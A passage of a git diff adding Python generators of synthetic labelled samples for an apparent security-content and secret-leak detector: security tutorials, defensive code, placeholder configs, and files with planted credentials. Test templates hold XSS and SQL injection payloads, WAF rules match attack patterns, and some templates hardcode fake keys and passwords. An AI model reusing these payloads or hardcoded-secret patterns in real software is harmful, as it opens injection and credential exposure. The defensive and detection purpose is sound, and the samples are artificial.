@@ -438,27 +438,447 @@ def gen_decodable_tokens(n: int) -> list:
 
 
 # ═══════════════════════════════════════════════════════════════════════
+# SECTION D: New boundary-case generators (v2)
+# ═══════════════════════════════════════════════════════════════════════
+
+# ── A. Safe Security Tutorials ──────────────────────────────────────
+
+def gen_safe_security_tutorials(n: int) -> list:
+    """Educational security content — discusses attacks but IS safe."""
+    owasp_topics = [
+        ("XSS", "Cross-Site Scripting", "output encoding, Content Security Policy, input validation"),
+        ("SQLi", "SQL Injection", "parameterized queries, prepared statements, ORM usage"),
+        ("SSRF", "Server-Side Request Forgery", "URL allowlists, network segmentation, input validation"),
+        ("XXE", "XML External Entity", "disable external entity processing, use JSON instead"),
+        ("CSRF", "Cross-Site Request Forgery", "anti-CSRF tokens, SameSite cookies, origin checking"),
+        ("IDOR", "Insecure Direct Object Reference", "authorization checks, indirect references, access control"),
+        ("RCE", "Remote Code Execution", "input sanitization, sandboxing, least-privilege execution"),
+        ("SSTI", "Server-Side Template Injection", "sandboxed template engines, input validation"),
+        ("LFI", "Local File Inclusion", "path canonicalization, chroot, allowlists"),
+        ("Deserialization", "Insecure Deserialization", "signed tokens, allowlisting classes, avoiding native serialization"),
+    ]
+    ctf_platforms = ["HackTheBox", "TryHackMe", "PicoCTF", "OverTheWire", "VulnHub", "DVWA", "WebGoat"]
+    conferences = ["DEF CON", "Black Hat", "BSides", "OWASP AppSec", "ShmooCon", "RSA Conference", "Nullcon"]
+    sec_tools = ["Burp Suite", "OWASP ZAP", "Metasploit", "Nmap", "Nikto", "sqlmap", "Gobuster", "Hydra", "John the Ripper", "Hashcat"]
+
+    tmpls = [
+        # OWASP cheat sheet style
+        lambda t: f"# OWASP Cheat Sheet: {t[1]} Prevention\n\n## What is {t[1]}?\n{t[1]} ({t[0]}) is a web security vulnerability that allows an attacker to interfere with application behavior.\n\n## How It Works\nThe attacker exploits insufficient input validation to inject malicious data into the application.\n\n### Example Attack Vector (DO NOT USE — educational only)\nA typical {t[0]} payload might target input fields that reflect user data without sanitization.\n\n## Prevention\nDefenses include: {t[2]}.\n\n### Code Example (Safe Version)\n```python\n# CORRECT: Using parameterized approach\ndef safe_handler(user_input):\n    sanitized = escape(user_input)\n    return render_safe(sanitized)\n```\n\n## References\n- OWASP Testing Guide v4\n- CWE-{random.randint(20,900)}\n- NIST SP 800-53\n\n*This document is for educational purposes. No working exploit code is included.*",
+
+        # CTF writeup
+        lambda t: f"# CTF Writeup: {random.choice(ctf_platforms)} — {t[1]} Challenge\n**Author**: {rand_name()} | **Date**: {rand_date()} | **Difficulty**: {random.choice(['Easy','Medium','Hard','Insane'])}\n\n## Challenge Description\nWe're given a web app with a {t[0].lower()} vulnerability in the search endpoint.\nGoal: Retrieve the flag from the admin panel.\n\n## Reconnaissance\n1. Ran {random.choice(sec_tools)} against the target\n2. Identified {t[0]} vector in /search parameter\n3. Application reflects input without proper encoding\n\n## Exploitation Steps\n1. Tested input reflection behavior\n2. Confirmed {t[0]} via error-based technique\n3. Escalated to read the flag file\n4. Flag: `CTF{{{rand_hex(32)}}}`\n\n## Lessons Learned\nIn production, prevent this with: {t[2]}.\n\n## Mitigation\n```\n# Fix: Apply proper {t[2].split(',')[0].strip()}\n```\n\n*Performed in an authorized CTF environment. Do not attempt on real systems.*",
+
+        # Academic paper abstract
+        lambda t: f"# {t[1]}: A Comprehensive Survey of Attack Vectors and Defenses\n\n**Authors**: {rand_name()}, {rand_name()}, {rand_name()}\n**Published**: Journal of Cybersecurity, Vol. {random.randint(10,30)}, {random.choice(['2023','2024','2025'])}\n**DOI**: 10.1109/JCYB.{random.randint(2023,2025)}.{random.randint(1000000,9999999)}\n\n## Abstract\n{t[1]} ({t[0]}) remains one of the most prevalent web application vulnerabilities, appearing in {random.randint(20,60)}% of assessed applications. This paper surveys {random.randint(50,200)} recent {t[0]} attack variants, categorizes them by exploitation technique, and evaluates {random.randint(10,30)} proposed defenses.\n\n## Key Findings\n- {random.randint(40,80)}% of {t[0]} attacks exploit insufficient input validation\n- Modern WAFs detect only {random.randint(50,85)}% of novel {t[0]} payloads\n- Most effective defense: {t[2]}\n\n## Conclusion\nDefense-in-depth combining {t[2]} provides the strongest protection.\n\n*No exploit code is provided. All experiments conducted in controlled lab environments.*",
+
+        # Conference talk transcript
+        lambda t: f"# {random.choice(conferences)} {random.choice(['2024','2025'])} — Talk Transcript\n## \"{t[1]}: From Discovery to Defense\"\n**Speaker**: {rand_name()}, {random.choice(['Principal Security Researcher','Staff Red Team','CISO'])}\n\nGood afternoon everyone. Today I'm going to walk through {t[0]} attacks — how they work, why they're still so common, and most importantly, how to defend against them.\n\n[Slide 3] The attack surface here is any endpoint that processes {random.choice(['user input','XML data','file paths','URL parameters'])} without validation.\n\n[Slide 7] In our assessments last year, we found {t[0]} in {random.randint(30,70)}% of applications tested. The root cause is almost always the same: trusting user input.\n\n[Slide 12] Defense strategy:\n1. {t[2].split(',')[0].strip()}\n2. Defense in depth\n3. Regular security testing\n\nQuestions? Find me at the badge party tonight.\n\n*Transcript shared with speaker permission. Educational content only.*",
+
+        # Vulnerability disclosure report
+        lambda t: f"# Vulnerability Disclosure Report\n**ID**: VD-{random.randint(2024,2026)}-{random.randint(1000,9999)}\n**Product**: {random.choice(['CloudSuite','DataPlatform','WebPortal','APIGateway'])} v{random.randint(2,8)}.{random.randint(0,15)}\n**Type**: {t[1]} ({t[0]})\n**CVSS**: {random.uniform(5.0,9.5):.1f}\n**Status**: FIXED in v{random.randint(2,8)}.{random.randint(0,15)}.{random.randint(1,10)}\n\n## Summary\nA {t[0]} vulnerability was discovered in the {random.choice(['search','upload','profile','admin'])} endpoint.\n\n## Impact\nAn authenticated attacker could exploit this to {random.choice(['read unauthorized data','execute arbitrary commands','bypass authentication','escalate privileges'])}.\n\n## Timeline\n- Reported: {rand_date()}\n- Acknowledged: {rand_date()}\n- Patched: {rand_date()}\n- Disclosed: {rand_date()}\n\n## Remediation Applied\n{t[2].capitalize()}.\n\n*Exploit details redacted per coordinated disclosure policy. No working PoC included.*",
+
+        # Bug bounty report
+        lambda t: f"# Bug Bounty Report — {random.choice(['HackerOne','Bugcrowd','Synack'])}\n**Program**: {random.choice(['Acme Corp','TechGiant','CloudFirst'])} VDP\n**Reporter**: {rand_name()} (@{rand_name().split()[0].lower()}{random.randint(1,99)})\n**Severity**: {random.choice(['Medium','High','Critical'])}\n**Bounty**: ${random.randint(500,25000):,}\n\n## Title\n{t[1]} in {random.choice(['/api/v2/search','/user/profile','/admin/export','/webhook/callback'])}\n\n## Description\nThe endpoint fails to {random.choice(['sanitize','validate','escape'])} user-supplied input, allowing {t[0]}.\n\n## Steps to Reproduce\n1. Authenticate as a regular user\n2. Navigate to the vulnerable endpoint\n3. [Payload redacted — available to triager on request]\n4. Observe the {random.choice(['reflected output','error response','unauthorized data'])}\n\n## Recommended Fix\n{t[2].capitalize()}.\n\n*Payload details withheld. Tested only against authorized scope.*",
+
+        # Security tool documentation
+        lambda t: (lambda tool=random.choice(sec_tools): f"# {tool} — User Guide: {t[0]} Testing\n\n## Overview\n{tool} can be used to test for {t[1]} vulnerabilities in web applications during authorized penetration tests.\n\n## Setup\n```bash\n# Install {tool.lower().replace(' ', '-')}\n# Ensure you have written authorization before testing\n```\n\n## Usage for {t[0]} Detection\n1. Configure target scope (authorized hosts only)\n2. Run the {t[0].lower()} scanner module\n3. Review findings in the results panel\n4. Verify each finding manually to eliminate false positives\n\n## Interpreting Results\n- **High confidence**: Confirmed {t[0]} with evidence\n- **Medium**: Possible {t[0]}, manual verification needed\n- **Info**: Input reflection detected, may not be exploitable\n\n## Remediation Guidance\nWhen {t[0]} is confirmed, recommend: {t[2]}.\n\n## Legal Notice\nOnly use {tool} against systems you have explicit written authorization to test. Unauthorized testing is illegal.\n\n*Documentation for authorized security professionals.*")(),
+
+        # Code review comment
+        lambda t: f"# Code Review: PR #{random.randint(100,9999)} — Security Findings\n**Reviewer**: {rand_name()} (AppSec Team)\n**Repository**: {random.choice(['backend-api','web-app','auth-service'])}\n\n## Finding 1: Potential {t[1]} ({t[0]})\n**File**: `src/{random.choice(['handlers','controllers','routes'])}/{random.choice(['search','user','admin'])}.{random.choice(['py','js','go'])}`\n**Line**: {random.randint(50,500)}\n\n### Issue\nUser input from the request parameter is passed directly to {random.choice(['the template renderer','the SQL query','the system command','the XML parser'])} without sanitization.\n\n### Suggestion\n```\n# Instead of using raw input, apply:\n# {t[2].split(',')[0].strip()}\nsanitized_input = sanitize(request.params['input'])\n```\n\n### Risk\nIf deployed, this could allow {t[0]} attacks.\n\n### Priority\nBlock merge until fixed.\n\n*Internal code review — no exploit code, only remediation guidance.*",
+    ]
+    samples = []
+    for _ in range(n):
+        t = random.choice(owasp_topics)
+        tmpl = random.choice(tmpls)
+        samples.append({"text": tmpl(t), "findings": [
+            {"category": "safe", "subcategory": "safe.documentation", "severity": "info",
+             "explanation": f"Educational security content discussing {t[1]} ({t[0]}). Contains attack descriptions for learning/defense purposes but no working exploit code. Safe documentation."}
+        ]})
+    return samples
+
+
+# ── B. Safe Code with Security Patterns ─────────────────────────────
+
+def gen_safe_security_code(n: int) -> list:
+    """Code implementing security defenses — safe, not malicious."""
+    tmpls = [
+        # Input sanitization
+        lambda: f"import html\nimport re\n\ndef sanitize_html(user_input: str) -> str:\n    \"\"\"Strip all HTML tags and escape special characters.\"\"\"\n    # Remove any HTML tags\n    cleaned = re.sub(r'<[^>]+>', '', user_input)\n    # Escape remaining special chars\n    return html.escape(cleaned, quote=True)\n\ndef sanitize_sql_identifier(name: str) -> str:\n    \"\"\"Allowlist approach for SQL identifiers.\"\"\"\n    if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]{{0,63}}$', name):\n        raise ValueError(f'Invalid identifier: {{name}}')\n    return name\n\ndef parameterized_query(db, query: str, params: tuple):\n    \"\"\"Always use parameterized queries — never string concatenation.\"\"\"\n    cursor = db.cursor()\n    cursor.execute(query, params)  # params are escaped by driver\n    return cursor.fetchall()",
+
+        # Auth middleware
+        lambda: f"import bcrypt\nimport jwt\nimport time\nfrom functools import wraps\n\nSECRET_KEY = os.environ['JWT_SECRET']  # loaded from env, never hardcoded\n\ndef hash_password(password: str) -> str:\n    salt = bcrypt.gensalt(rounds=12)\n    return bcrypt.hashpw(password.encode(), salt).decode()\n\ndef verify_password(password: str, hashed: str) -> bool:\n    return bcrypt.checkpw(password.encode(), hashed.encode())\n\ndef create_token(user_id: int, role: str) -> str:\n    payload = {{\n        'sub': user_id,\n        'role': role,\n        'iat': int(time.time()),\n        'exp': int(time.time()) + 3600,\n    }}\n    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')\n\ndef require_auth(f):\n    @wraps(f)\n    def decorated(*args, **kwargs):\n        token = request.headers.get('Authorization', '').replace('Bearer ', '')\n        try:\n            payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n            request.user = payload\n        except jwt.InvalidTokenError:\n            return {{'error': 'Unauthorized'}}, 401\n        return f(*args, **kwargs)\n    return decorated",
+
+        # CSP header config
+        lambda: f"# Content Security Policy Configuration\n# Prevents XSS, clickjacking, and data injection attacks\n\nfrom flask import Flask, make_response\n\ndef configure_security_headers(app: Flask):\n    @app.after_request\n    def add_security_headers(response):\n        response.headers['Content-Security-Policy'] = (\n            \"default-src 'self'; \"\n            \"script-src 'self' 'nonce-{{{{nonce}}}}'; \"\n            \"style-src 'self' 'unsafe-inline'; \"\n            \"img-src 'self' data: https:; \"\n            \"font-src 'self'; \"\n            \"connect-src 'self' https://api.example.com; \"\n            \"frame-ancestors 'none'; \"\n            \"base-uri 'self'; \"\n            \"form-action 'self'\"\n        )\n        response.headers['X-Content-Type-Options'] = 'nosniff'\n        response.headers['X-Frame-Options'] = 'DENY'\n        response.headers['X-XSS-Protection'] = '0'  # CSP replaces this\n        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'\n        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'\n        return response",
+
+        # CORS policy
+        lambda: f"// CORS configuration — restrict to known origins\nconst cors = require('cors');\n\nconst ALLOWED_ORIGINS = [\n    'https://app.example.com',\n    'https://admin.example.com',\n];\n\nconst corsOptions = {{\n    origin: function (origin, callback) {{\n        // Allow requests with no origin (mobile apps, curl)\n        if (!origin) return callback(null, true);\n        if (ALLOWED_ORIGINS.includes(origin)) {{\n            callback(null, true);\n        }} else {{\n            callback(new Error('CORS: Origin not allowed'));\n        }}\n    }},\n    methods: ['GET', 'POST', 'PUT', 'DELETE'],\n    allowedHeaders: ['Content-Type', 'Authorization'],\n    credentials: true,\n    maxAge: 86400,\n}};\n\napp.use(cors(corsOptions));",
+
+        # Rate limiting
+        lambda: f"import time\nfrom collections import defaultdict\nimport threading\n\nclass RateLimiter:\n    \"\"\"Token bucket rate limiter for API endpoints.\"\"\"\n\n    def __init__(self, max_requests=100, window_seconds=60):\n        self.max_requests = max_requests\n        self.window = window_seconds\n        self._buckets = defaultdict(list)\n        self._lock = threading.Lock()\n\n    def is_allowed(self, client_id: str) -> bool:\n        now = time.time()\n        with self._lock:\n            # Remove expired entries\n            self._buckets[client_id] = [\n                ts for ts in self._buckets[client_id]\n                if now - ts < self.window\n            ]\n            if len(self._buckets[client_id]) >= self.max_requests:\n                return False\n            self._buckets[client_id].append(now)\n            return True\n\n    def get_retry_after(self, client_id: str) -> int:\n        if not self._buckets[client_id]:\n            return 0\n        oldest = min(self._buckets[client_id])\n        return max(0, int(self.window - (time.time() - oldest)))\n\nlimiter = RateLimiter(max_requests=60, window_seconds=60)\n\n# Usage in middleware:\n# if not limiter.is_allowed(request.remote_addr):\n#     return 429, {{'retry_after': limiter.get_retry_after(request.remote_addr)}}",
+
+        # WAF rules
+        lambda: f"# WAF Rule Definitions — ModSecurity/OWASP CRS style\n# These rules BLOCK attacks, they don't perform them\n\nSecRule REQUEST_URI \"@rx (?i)(union.*select|insert.*into|delete.*from|drop.*table)\" \\\n    \"id:1001,phase:2,deny,status:403,msg:'SQL Injection attempt blocked'\"\n\nSecRule REQUEST_BODY \"@rx (?i)(<script|javascript:|on\\w+\\s*=)\" \\\n    \"id:1002,phase:2,deny,status:403,msg:'XSS attempt blocked'\"\n\nSecRule REQUEST_URI \"@rx (\\.\\./|\\.\\.\\\\)\" \\\n    \"id:1003,phase:1,deny,status:403,msg:'Path traversal blocked'\"\n\nSecRule REQUEST_HEADERS:Content-Type \"@rx (?i)(text/xml|application/xml)\" \\\n    \"id:1004,phase:1,chain\"\n    SecRule REQUEST_BODY \"@rx <!ENTITY\" \\\n        \"deny,status:403,msg:'XXE attempt blocked'\"\n\n# Rate limiting rule\nSecRule IP:REQUEST_COUNT \"@gt 100\" \\\n    \"id:1010,phase:1,deny,status:429,msg:'Rate limit exceeded'\"\n\n# These are DEFENSIVE rules — they protect the application.",
+
+        # Security test cases
+        lambda: f"import pytest\nfrom app.security import sanitize_html, validate_input\n\nclass TestXSSPrevention:\n    \"\"\"Verify our sanitizer blocks XSS payloads.\"\"\"\n\n    @pytest.mark.parametrize('payload', [\n        '<script>alert(1)</script>',\n        '<img src=x onerror=alert(1)>',\n        '<svg onload=alert(1)>',\n        '\" onfocus=\"alert(1)\" autofocus=\"',\n        \"javascript:alert(document.cookie)\",\n    ])\n    def test_xss_payloads_sanitized(self, payload):\n        result = sanitize_html(payload)\n        assert '<script' not in result\n        assert 'onerror' not in result\n        assert 'javascript:' not in result\n\n    def test_safe_html_preserved(self):\n        safe = 'Hello <b>world</b>'\n        assert 'Hello' in sanitize_html(safe)\n\nclass TestSQLiPrevention:\n    @pytest.mark.parametrize('payload', [\n        \"' OR 1=1 --\",\n        \"'; DROP TABLE users; --\",\n        \"' UNION SELECT * FROM passwords --\",\n    ])\n    def test_sqli_blocked(self, payload):\n        with pytest.raises(ValueError):\n            validate_input(payload)\n\n# These are DEFENSE tests — verifying security controls work.",
+
+        # Pentest tool config
+        lambda: f"# Nuclei scan configuration — authorized penetration test\n# Target: staging.example.com (written authorization on file)\n\ntargets:\n  - staging.example.com\n  - staging-api.example.com\n\nexclusions:\n  - production.example.com  # NEVER scan production\n  - \"*.customer-data.*\"     # Exclude customer endpoints\n\ntemplates:\n  - cves/\n  - vulnerabilities/\n  - misconfiguration/\n\nrate-limit: 50  # requests per second\nconcurrency: 10\ntimeout: 10s\nretries: 1\n\nreporting:\n  output: ./results/scan-{{{{date}}}}.json\n  severity: [critical, high, medium]\n\n# Authorization: PENTEST-AUTH-{random.randint(2024,2026)}-{random.randint(100,999)}\n# Scope approved by: {rand_name()}, CISO\n# Valid: {rand_date()} to {rand_date()}",
+    ]
+    samples = []
+    for _ in range(n):
+        samples.append({"text": random.choice(tmpls)(), "findings": [
+            {"category": "safe", "subcategory": "safe.code", "severity": "info",
+             "explanation": "Security defense implementation (sanitization, auth, CSP, rate limiting, WAF rules, or security tests). This code protects against attacks — it does not perform them."}
+        ]})
+    return samples
+
+
+# ── C. Safe Config Files ────────────────────────────────────────────
+
+def gen_safe_config_files(n: int) -> list:
+    """Config files that mention secrets but contain only placeholders/references."""
+    tmpls = [
+        # .env.example files
+        lambda: f"# .env.example — Copy to .env and fill in your values\n# DO NOT commit .env to version control\n\n# Application\nAPP_NAME=myapp\nAPP_ENV=development\nAPP_PORT=3000\nDEBUG=true\n\n# Database\nDB_HOST=localhost\nDB_PORT=5432\nDB_NAME=myapp_dev\nDB_USER=your_username_here\nDB_PASSWORD=your_password_here\n\n# API Keys\nSTRIPE_API_KEY=your_key_here\nSENDGRID_API_KEY=your_key_here\nAWS_ACCESS_KEY_ID=your_key_here\nAWS_SECRET_ACCESS_KEY=your_secret_here\n\n# Auth\nJWT_SECRET=generate_a_random_secret\nSESSION_SECRET=generate_a_random_secret\n\n# ALL values above are PLACEHOLDERS. Replace before running.",
+
+        # Docker compose with dev defaults
+        lambda: f"# docker-compose.yml — LOCAL DEVELOPMENT ONLY\n# Default passwords are for local dev containers only\nversion: '3.8'\n\nservices:\n  postgres:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_DB: app_development\n      POSTGRES_USER: devuser\n      POSTGRES_PASSWORD: devpassword  # Local dev only\n    ports:\n      - '5432:5432'\n    volumes:\n      - pgdata:/var/lib/postgresql/data\n\n  redis:\n    image: redis:7-alpine\n    command: redis-server --requirepass localredis  # Dev password\n    ports:\n      - '6379:6379'\n\n  rabbitmq:\n    image: rabbitmq:3-management\n    environment:\n      RABBITMQ_DEFAULT_USER: guest  # Default dev\n      RABBITMQ_DEFAULT_PASS: guest  # Default dev\n    ports:\n      - '5672:5672'\n      - '15672:15672'\n\nvolumes:\n  pgdata:\n\n# WARNING: These are well-known defaults for LOCAL DEVELOPMENT.\n# Production uses Kubernetes secrets. See deploy/k8s/secrets.yaml",
+
+        # Terraform with variable references
+        lambda: f"# main.tf — Infrastructure as Code\n# All secrets come from variables (injected via CI/CD)\n\nvariable \"db_password\" {{\n  type      = string\n  sensitive = true\n}}\n\nvariable \"api_key\" {{\n  type      = string\n  sensitive = true\n}}\n\nresource \"aws_db_instance\" \"main\" {{\n  identifier     = \"myapp-{random.choice(['prod','staging'])}\"\n  engine         = \"postgres\"\n  engine_version = \"16.1\"\n  instance_class = \"db.t3.medium\"\n  username       = \"appuser\"\n  password       = var.db_password  # From Terraform Cloud\n  db_name        = \"myapp\"\n\n  tags = {{\n    Environment = \"{random.choice(['production','staging'])}\"\n  }}\n}}\n\nresource \"aws_ssm_parameter\" \"api_key\" {{\n  name  = \"/myapp/api_key\"\n  type  = \"SecureString\"\n  value = var.api_key  # Encrypted at rest\n}}\n\n# No hardcoded secrets — all values from variables.",
+
+        # CI/CD with secret references
+        lambda: f"# .github/workflows/deploy.yml\nname: Deploy to Production\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{{{ secrets.AWS_ACCESS_KEY_ID }}}}\n          aws-secret-access-key: ${{{{ secrets.AWS_SECRET_ACCESS_KEY }}}}\n          aws-region: us-east-1\n\n      - name: Deploy\n        env:\n          DB_PASSWORD: ${{{{ secrets.DB_PASSWORD }}}}\n          API_KEY: ${{{{ secrets.API_KEY }}}}\n          STRIPE_KEY: ${{{{ secrets.STRIPE_SECRET_KEY }}}}\n          SENTRY_DSN: ${{{{ secrets.SENTRY_DSN }}}}\n        run: |\n          ./scripts/deploy.sh\n\n# All secrets are GitHub encrypted secrets — no values in this file.",
+
+        # .gitignore listing sensitive files
+        lambda: f"# .gitignore — Protect sensitive files from being committed\n\n# Environment files with secrets\n.env\n.env.local\n.env.production\n.env.*.local\n\n# Credentials\ncredentials.json\nservice-account.json\n*.pem\n*.key\nid_rsa\nid_ed25519\n\n# Cloud provider\n.aws/credentials\n.gcloud/\ntfstate\n*.tfstate\n*.tfstate.backup\n.terraform/\n\n# IDE\n.vscode/settings.json\n.idea/\n*.swp\n\n# Build artifacts\ndist/\nbuild/\nnode_modules/\n__pycache__/\n*.pyc\n\n# Logs that might contain tokens\n*.log\nlogs/\n\n# Coverage\ncoverage/\n.nyc_output/",
+
+        # Security policy document
+        lambda: f"# SECURITY.md\n\n## Security Policy\n\n### Supported Versions\n| Version | Supported |\n|---------|-----------|\n| 3.x     | Yes       |\n| 2.x     | Security fixes only |\n| < 2.0   | No        |\n\n### Reporting a Vulnerability\nPlease report security vulnerabilities to security@example.com.\n\n**DO NOT** open a public GitHub issue for security vulnerabilities.\n\n### Response Timeline\n- Acknowledgement: within 48 hours\n- Triage: within 5 business days\n- Fix: depends on severity (Critical: 7 days, High: 30 days)\n\n### Scope\n- Authentication and authorization bypasses\n- Data exposure vulnerabilities\n- Remote code execution\n- Cross-site scripting (XSS)\n- SQL injection\n\n### Out of Scope\n- Rate limiting on public APIs\n- Missing security headers on non-sensitive pages\n- Social engineering attacks\n\n### Hall of Fame\nWe thank the following researchers:\n- {rand_name()} — {random.choice(['XSS in admin panel','IDOR in API','SSRF via webhook'])}\n- {rand_name()} — {random.choice(['Auth bypass','Privilege escalation','Open redirect'])}\n\n*This is a security policy document, not a vulnerability report.*",
+
+        # Kubernetes RBAC
+        lambda: f"# k8s/rbac.yaml — Role-Based Access Control\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  namespace: production\n  name: app-reader\nrules:\n  - apiGroups: [\"\"]\n    resources: [\"pods\", \"services\"]\n    verbs: [\"get\", \"list\", \"watch\"]\n  - apiGroups: [\"\"]\n    resources: [\"secrets\"]\n    verbs: []  # No access to secrets\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: app-reader-binding\n  namespace: production\nsubjects:\n  - kind: ServiceAccount\n    name: app-sa\nroleRef:\n  kind: Role\n  name: app-reader\n  apiGroup: rbac.authorization.k8s.io\n\n# Least-privilege RBAC — no secret access granted.",
+
+        # Vault config
+        lambda: f"# vault-config.hcl — HashiCorp Vault configuration\nstorage \"raft\" {{\n  path    = \"/vault/data\"\n  node_id = \"vault-{random.randint(1,3)}\"\n}}\n\nlistener \"tcp\" {{\n  address     = \"0.0.0.0:8200\"\n  tls_cert_file = \"/vault/certs/server.crt\"\n  tls_key_file  = \"/vault/certs/server.key\"\n}}\n\napi_addr     = \"https://vault.internal:8200\"\ncluster_addr = \"https://vault.internal:8201\"\n\nseal \"awskms\" {{\n  region     = \"us-east-1\"\n  kms_key_id = \"alias/vault-unseal\"  # KMS alias, not a secret\n}}\n\ntelemetry {{\n  prometheus_retention_time = \"24h\"\n  disable_hostname          = true\n}}\n\n# Vault config — no secrets stored here. Secrets managed inside Vault.",
+    ]
+    samples = []
+    for _ in range(n):
+        samples.append({"text": random.choice(tmpls)(), "findings": [
+            {"category": "safe", "subcategory": "safe.config", "severity": "info",
+             "explanation": "Configuration file with placeholder values, variable references, secret manager references, or development defaults. No real credentials exposed."}
+        ]})
+    return samples
+
+
+# ── D. Hidden Credentials in Innocent-Looking Files ─────────────────
+
+def gen_hidden_creds_in_innocent_files(n: int) -> list:
+    """Real credentials buried in files that look harmless."""
+    tmpls = [
+        # TODO comment with real key
+        lambda: (lambda provider=random.choice(["AWS","Stripe","GitHub","OpenAI","Anthropic"]),
+                        key=None: (
+            lambda p, k: f"# app/services/{p.lower()}_client.py\nimport requests\n\nclass {p}Client:\n    BASE_URL = 'https://api.{p.lower()}.com/v1'\n\n    def __init__(self, api_key=None):\n        self.api_key = api_key or self._get_key()\n\n    def _get_key(self):\n        # TODO: remove before commit: {k}\n        return '{k}'\n\n    def list_resources(self):\n        resp = requests.get(\n            f'{{self.BASE_URL}}/resources',\n            headers={{'Authorization': f'Bearer {{self.api_key}}'}}\n        )\n        return resp.json()\n\n    def get_resource(self, resource_id):\n        return requests.get(f'{{self.BASE_URL}}/resources/{{resource_id}}')"
+        )(provider, rand_key(provider)))(),
+
+        # Hardcoded creds in "test" file with real keys
+        lambda: (lambda k1=rand_key("Stripe"), k2=rand_key("OpenAI"):
+            f"# tests/integration/test_payment_flow.py\n# NOTE: these are the staging keys — keep them for CI\nimport stripe\n\nSTRIPE_KEY = \"{k1}\"\nOPENAI_KEY = \"{k2}\"\n\ndef test_create_charge():\n    stripe.api_key = STRIPE_KEY\n    charge = stripe.Charge.create(amount=1000, currency='usd', source='tok_visa')\n    assert charge['status'] == 'succeeded'\n\ndef test_ai_classification():\n    import openai\n    openai.api_key = OPENAI_KEY\n    # Should classify as 'fraud'\n    resp = openai.ChatCompletion.create(model='gpt-4', messages=[{{'role':'user','content':'test'}}])\n    assert resp"
+        )(),
+
+        # Base64 encoded credentials in config
+        lambda: (lambda key=rand_key(random.choice(["AWS","Stripe","GitHub"])):
+            f"# config/production.yaml\napp:\n  name: backend-service\n  port: 8080\n  workers: 4\n\nlogging:\n  level: info\n  format: json\n\n# Encoded for transport — decode at runtime\nauth:\n  provider_key: \"{base64.b64encode(key.encode()).decode()}\"\n  encoding: base64\n\ndatabase:\n  host: db.internal\n  port: 5432\n  pool_size: 20"
+        )(),
+
+        # Git diff with credential addition
+        lambda: (lambda key=rand_key(random.choice(["Stripe","OpenAI","SendGrid","Anthropic"])):
+            f"diff --git a/config/settings.py b/config/settings.py\nindex 4a5b6c7..8d9e0f1 100644\n--- a/config/settings.py\n+++ b/config/settings.py\n@@ -15,6 +15,8 @@ class Settings:\n     APP_NAME = \"myservice\"\n     DEBUG = False\n     PORT = 8080\n+    # Added for new integration\n+    API_KEY = \"{key}\"\n     DATABASE_URL = os.environ['DATABASE_URL']\n     REDIS_URL = os.environ.get('REDIS_URL', 'redis://localhost:6379')"
+        )(),
+
+        # Log file with Bearer token
+        lambda: (lambda token=rand_key(random.choice(["GitHub","OpenAI","Stripe","Anthropic"])):
+            f"[{rand_date()} 14:23:01.{random.randint(100,999)}] INFO  Server started on :8080\n[{rand_date()} 14:23:15.{random.randint(100,999)}] INFO  GET /health 200 2ms\n[{rand_date()} 14:23:46.{random.randint(100,999)}] DEBUG Request headers: {{'Host': 'api.internal', 'Authorization': 'Bearer {token}', 'Content-Type': 'application/json', 'X-Request-Id': '{rand_hex(16)}'}}\n[{rand_date()} 14:23:46.{random.randint(100,999)}] INFO  POST /api/v2/process 200 145ms\n[{rand_date()} 14:23:47.{random.randint(100,999)}] INFO  GET /metrics 200 3ms\n[{rand_date()} 14:24:01.{random.randint(100,999)}] DEBUG Connection pool: 18/20 active\n[{rand_date()} 14:24:15.{random.randint(100,999)}] INFO  POST /api/v2/process 200 132ms"
+        )(),
+
+        # .env file (no .example suffix)
+        lambda: (lambda k1=rand_key("Stripe"), k2=rand_key("AWS"), k3=rand_key("SendGrid"):
+            f"# .env\nAPP_NAME=production-api\nAPP_ENV=production\nPORT=8080\n\nDATABASE_URL=postgresql://appuser:Pr0d_P@ss_2024!@db.internal:5432/production\nREDIS_URL=redis://:R3dis$ecret@cache.internal:6379/0\n\nSTRIPE_SECRET_KEY={k1}\nAWS_ACCESS_KEY_ID={k2}\nSENDGRID_API_KEY={k3}\n\nJWT_SECRET=a7f3b2e9d1c4f8a6e5b3d7c2f1a9e4b8d6c3f7a2e5b1d4c8f6a3e9b2d7c5f1\nSESSION_SECRET=x9k2m5n8p1q4r7s0t3u6v9w2y5z8a1b4c7d0e3f6g9h2j5"
+        )(),
+
+        # SSH config with password
+        lambda: f"# ~/.ssh/config\nHost production-bastion\n    HostName {rand_ip()}\n    User deploy\n    Port 22\n    IdentityFile ~/.ssh/id_prod\n    # Password for key: Pr0duct10n_{rand_hex(8)}!@\n    # TODO: switch to agent forwarding\n\nHost staging\n    HostName {rand_ip()}\n    User admin\n    Port 2222\n    # Temp password until key is set up: Stag1ng_{rand_hex(8)}#$\n\nHost database-tunnel\n    HostName {rand_ip()}\n    User tunnel\n    LocalForward 5432 db.internal:5432\n    # DB creds: appuser / DB_P@ss_{rand_hex(10)}",
+
+        # Jupyter notebook with API keys
+        lambda: (lambda k1=rand_key("OpenAI"), k2=rand_key("Anthropic"):
